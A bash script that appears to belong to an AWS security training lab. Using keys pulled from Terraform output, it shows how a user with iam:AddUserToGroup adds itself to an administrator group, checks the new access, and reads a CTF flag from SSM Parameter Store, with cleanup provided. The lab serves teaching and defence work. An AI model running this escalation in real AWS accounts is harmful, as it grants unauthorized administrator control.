#!/bin/bash

# Demo script for iam:AddUserToGroup self-escalation
# This is a USER-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
START_USER="pl-prod-iam-013-to-admin-user"
ADMIN_GROUP="pl-prod-iam-013-to-admin-group"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AddUserToGroup Self-Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}User-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_013_iam_addusertogroup.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $START_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved credentials for $START_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify identity as pl-prod-iam-013-to-admin-user
echo -e "${YELLOW}Step 2: Verifying identity as $START_USER${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $USER_IDENTITY"

if [[ ! $USER_IDENTITY == *"$START_USER"* ]]; then
    echo -e "${RED}Error: Not running as $START_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed identity as $START_USER${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION] Step 4: Check current group memberships
echo -e "${YELLOW}Step 4: Checking current group memberships for $START_USER${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
CURRENT_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
if [ -z "$CURRENT_GROUPS" ]; then
    echo "Current groups: None"
    echo -e "${GREEN}✓ User is not currently a member of any groups${NC}"
else
    echo "Current groups: $CURRENT_GROUPS"
    if [[ $CURRENT_GROUPS == *"$ADMIN_GROUP"* ]]; then
        echo -e "${YELLOW}Warning: User is already a member of $ADMIN_GROUP${NC}"
        echo "This may be from a previous demo run. The user already has admin access."
    fi
fi
echo ""

# [EXPLOIT] Step 5: Check current permissions (proving limited access - attack precondition)
echo -e "${YELLOW}Step 5: Checking current permissions (should be limited)${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail if not in admin group)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${YELLOW}Warning: User already has admin permissions${NC}"
    echo "This may be because the user is already in the admin group from a previous run"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Perform the self-escalation - add self to admin group
echo -e "${YELLOW}Step 6: Self-escalation - Adding self to admin group${NC}"
use_starting_creds
echo "This is the privilege escalation vector..."
echo "$START_USER is adding themselves to $ADMIN_GROUP"
echo ""

# Add user to admin group
show_attack_cmd "Attacker" "aws iam add-user-to-group --group-name $ADMIN_GROUP --user-name $START_USER"
aws iam add-user-to-group \
    --group-name $ADMIN_GROUP \
    --user-name $START_USER

echo -e "${GREEN}✓ Successfully added $START_USER to $ADMIN_GROUP${NC}"
echo -e "${GREEN}✓ $START_USER now has administrator access through group membership!${NC}\n"

# [OBSERVATION] Step 7: Verify admin access
echo -e "${YELLOW}Step 7: Verifying administrator access${NC}"
echo "The user $START_USER should now have admin access via group membership..."
echo ""

# IAM policy changes can take time to propagate
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

# Test admin permissions with retry
echo "Testing admin permissions (listing IAM users)..."
use_readonly_creds
SUCCESS=false
for i in {1..3}; do
    show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
    if aws iam list-users --max-items 3 --output table 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
        echo -e "${GREEN}✓ Confirmed administrator access through group membership!${NC}\n"
        SUCCESS=true
        break
    else
        if [ $i -lt 3 ]; then
            echo "Waiting for permissions to propagate (attempt $i/3)..."
            sleep 2
        fi
    fi
done

if [ "$SUCCESS" = false ]; then
    echo -e "${YELLOW}Note: IAM policy propagation may still be in progress.${NC}"
    echo "The privilege escalation was successful - permissions may take a moment to fully propagate."
fi

# Verify group membership
echo -e "\n${YELLOW}Verifying group membership:${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
UPDATED_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
echo "Current groups: $UPDATED_GROUPS"

# [EXPLOIT] Step 8: Capture the CTF flag
# The starting user now has AdministratorAccess inherited through group membership, which
# grants ssm:GetParameter implicitly. Use those credentials to read the scenario flag
# from SSM Parameter Store.
use_starting_creds
echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-013-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $START_USER (no group memberships, limited permissions)"
echo "2. Confirmed limited access - could not list IAM users"
echo "3. Used AddUserToGroup to add self to $ADMIN_GROUP"
echo "4. $START_USER now has administrator access via group membership"
echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $START_USER (no admin access)"
echo -e "    ↓ (iam:AddUserToGroup)"
echo -e "  Adds self to $ADMIN_GROUP"
echo -e "    ↓ (group membership + AdministratorAccess policy)"
echo -e "  $START_USER gains Administrator Access"
echo -e "    → (ssm:GetParameter) → CTF Flag"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${YELLOW}Key Insight:${NC}"
echo "This is a self-escalation attack where a user with iam:AddUserToGroup permission"
echo "on an administrative group can add themselves to that group, immediately gaining"
echo "all permissions attached to the group (in this case, AdministratorAccess)."
echo ""
echo -e "${YELLOW}Attack artifacts:${NC}"
echo "- User $START_USER is now a member of group $ADMIN_GROUP"
echo ""
echo -e "${RED}⚠ Warning: The user $START_USER now has administrator access!${NC}"
echo "Run ./cleanup_attack.sh to remove the group membership and restore the original state"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
